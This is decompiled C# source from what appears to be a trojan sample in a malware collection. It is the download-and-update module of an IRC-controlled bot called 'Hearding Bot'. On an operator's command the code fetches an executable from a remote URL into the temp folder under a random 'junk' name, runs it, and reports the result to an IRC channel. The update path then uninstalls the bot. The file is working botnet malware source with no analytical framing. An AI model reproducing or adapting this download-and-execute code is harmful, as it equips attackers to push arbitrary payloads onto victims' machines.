﻿// Decompiled with JetBrains decompiler
// Type: Hearding_Bot.downloadUpdate
// Assembly: Hearding Bot, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 931E7B23-EA6E-4139-8BD0-1A4E0BF9E258
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan.Win32.Fsysna.dljm-a7abcca3397d1344b43d53c1427609ca1808f1991c5d2b158fd67c1ea3e6f19a.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace Hearding_Bot
{
  internal class downloadUpdate
  {
    private static string _args;

    private static void download()
    {
      string[] strArray;
      if (downloadUpdate._args.Contains(" "))
        strArray = downloadUpdate._args.Split(' ');
      else
        strArray = new string[1]{ downloadUpdate._args };
      string str = Path.GetTempPath() + "\\junk" + (object) new Random().Next(int.MinValue, int.MaxValue) + ".exe";
      if (strArray.Length > 1)
        str = strArray[1];
      string fileName = str.Replace("%mainDrive%", Path.GetTempPath()[0].ToString());
      WebClient webClient = new WebClient();
      DateTime now1 = DateTime.Now;
      bool flag = false;
      try
      {
        webClient.DownloadFile(new Uri(strArray[0]), fileName);
      }
      catch (Exception ex)
      {
        flag = true;
        Irc.WriteTo(Config.ircChannel, "Failed to download file");
      }
      DateTime now2 = DateTime.Now;
      if (strArray.Length == 1 || strArray.Length == 3 && strArray[2].ToString().ToLower() == "true")
      {
        if (!flag)
        {
          try
          {
            Process.Start(fileName);
          }
          catch (Exception ex)
          {
            Irc.WriteTo(Config.ircChannel, "Failed to execute file");
          }
        }
      }
      if (flag)
        return;
      Irc.WriteTo(Config.ircChannel, "Done Downloading File (~" + (object) (now1 - now2).TotalSeconds + "s)");
    }

    private static void install()
    {
      string[] strArray;
      if (downloadUpdate._args.Contains(" "))
        strArray = downloadUpdate._args.Split(' ');
      else
        strArray = new string[1]{ downloadUpdate._args };
      string str1 = Path.GetTempPath() + "\\junk" + (object) new Random().Next(int.MinValue, int.MaxValue) + ".exe";
      if (strArray.Length > 1)
        str1 = strArray[1];
      string str2 = str1.Replace("%mainDrive%", Path.GetTempPath()[0].ToString());
      WebClient webClient = new WebClient();
      DateTime now1 = DateTime.Now;
      bool flag = false;
      try
      {
        webClient.DownloadFile(new Uri(strArray[0]), str2);
      }
      catch (Exception ex)
      {
        Irc.WriteTo(Config.ircChannel, "Failed to download file");
      }
      DateTime now2 = DateTime.Now;
      if (!flag)
      {
        try
        {
          Process.Start(str2);
        }
        catch (Exception ex)
        {
          Irc.WriteTo(Config.ircChannel, "Failed to execute");
        }
      }
      if (!flag)
        Irc.WriteTo(Config.ircChannel, "Done Downloading File (~" + (object) (now2 - now1).TotalSeconds + "s), uninstalling self.");
      Install.uninstall(str2);
    }

    public static void downloadThread(string pass)
    {
      downloadUpdate._args = pass;
      new Thread(new ThreadStart(downloadUpdate.download)).Start();
    }

    public static void updateThread(string pass)
    {
      downloadUpdate._args = pass;
      new Thread(new ThreadStart(downloadUpdate.install)).Start();
    }
  }
}